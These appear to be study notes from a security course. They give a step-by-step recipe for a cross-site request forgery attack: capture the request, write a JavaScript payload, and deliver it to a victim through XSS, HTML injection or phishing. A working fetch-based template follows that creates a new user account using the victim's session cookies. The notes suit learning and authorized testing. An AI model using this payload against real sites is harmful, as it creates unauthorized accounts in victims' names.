#Generic CSRF payload example. 

Saving the payload examples you've created during the course is also useful. This serves as a general guide to writing a CSRF payload.

1. If possible, conduct the action you want the victim to execute within your own browser using Burp Suite so you can see how the payload (params + values) are formatted. 
2. Create a javascript payload.
3. Find a way to have the victim execute the JavaScript payload whether through an XSS, HTML Injection, or Phishing. 
4. Profit.

Example of a JavaScript payload to create a new user. This will create a new user named "MyUser" by targeting the "/api/newuser" API on "https://192.168.1.1". When executed (if you want to test on yourself) the console will output the messages "Creating new user..." when the API is being called then "Should be done now..." when the command has been executed.
```
  var user = "username=MyUser";
  var host = "https://192.168.1.1";
  var api_url = "/api/newuser";
	
function create_user() {
  console.log("Creating a new user...");
  fetch(host+api_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : user }
  ).then(
    console.log("Should be done...")
  );
}

create_user();
```
